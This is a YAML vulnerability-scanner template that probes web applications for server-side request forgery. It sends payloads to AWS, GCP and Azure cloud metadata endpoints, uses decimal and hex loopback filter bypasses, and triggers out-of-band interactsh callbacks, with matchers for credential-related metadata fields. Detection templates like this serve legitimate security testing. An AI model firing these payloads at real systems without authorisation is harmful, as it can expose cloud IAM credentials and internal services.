id: ssrf-comprehensive-detection

info:
  name: SSRF - Server-Side Request Forgery Comprehensive Detection
  author: achraf-chehboun
  severity: critical
  description: |
    Detects Server-Side Request Forgery using cloud metadata content validation and
    OOB (out-of-band) interactsh callbacks. Cloud metadata tests require multiple
    platform-specific response fields to confirm actual metadata access (not just
    status 200). Internal probing relies on interactsh for blind detection. Filter
    bypass tests use differential comparison against baseline responses.
  reference:
    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.1
    cwe-id: CWE-918
  metadata:
    max-request: 14
  tags: owasp-top10,ssrf,cloud-metadata,detection-only

http:
  # Cloud metadata via URL parameters — strict multi-field validation
  - raw:
      - |
        GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        name: aws-metadata-accessible
        dsl:
          - '(contains(body, "ami-id") && contains(body, "instance-id")) || (contains(body, "security-credentials") && contains(body, "iam")) || (contains(body, "local-ipv4") && contains(body, "public-hostname"))'

  # GCP metadata
  - raw:
      - |
        GET /?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        name: gcp-metadata-accessible
        dsl:
          - '(contains(body, "project-id") || contains(body, "instance/zone")) && (contains(body, "service-accounts") || contains(body, "computeMetadata"))'

  # Azure metadata
  - raw:
      - |
        GET /?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        name: azure-metadata-accessible
        dsl:
          - 'contains(body, "vmId") && (contains(body, "subscriptionId") || contains(body, "resourceGroupName"))'

  # Various parameter names for metadata
  - method: GET
    path:
      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?next=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?dest=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?path=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?file=http://169.254.169.254/latest/meta-data/"

    stop-at-first-match: true
    matchers:
      - type: dsl
        name: alt-param-metadata-accessible
        dsl:
          - 'status_code == 200 && ((contains(body, "ami-id") && contains(body, "instance-id")) || (contains(body, "security-credentials") && contains(body, "local-ipv4")))'

  # SSRF filter bypass with differential comparison
  - raw:
      - |
        GET /?url=http://xnlbz-nonexistent-domain.invalid/ HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
      - |
        GET /?url=http://2130706433/ HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
      - |
        GET /?url=http://0x7f000001/ HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    req-condition: true
    matchers:
      - type: dsl
        name: ssrf-bypass-decimal-or-hex
        dsl:
          - 'status_code_1 != 200 && status_code_2 == 200 && len(body_2) > 100 && body_1 != body_2'
          - 'status_code_1 != 200 && status_code_3 == 200 && len(body_3) > 100 && body_1 != body_3'
        condition: or

  # OOB (Out-of-Band) SSRF detection via DNS/HTTP callback
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://{{interactsh-url}}"
      - "{{BaseURL}}/?redirect=http://{{interactsh-url}}"
      - "{{BaseURL}}/?callback=http://{{interactsh-url}}"
      - "{{BaseURL}}/?webhook=http://{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        name: oob-ssrf-callback
        words:
          - "dns"
          - "http"
        condition: or

    extractors:
      - type: regex
        name: cloud-instance-data
        group: 0
        regex:
          - '(?:ami|instance|vm)[_-]?[Ii]d["\s:]*["\s]*([a-zA-Z0-9_-]{5,50})'
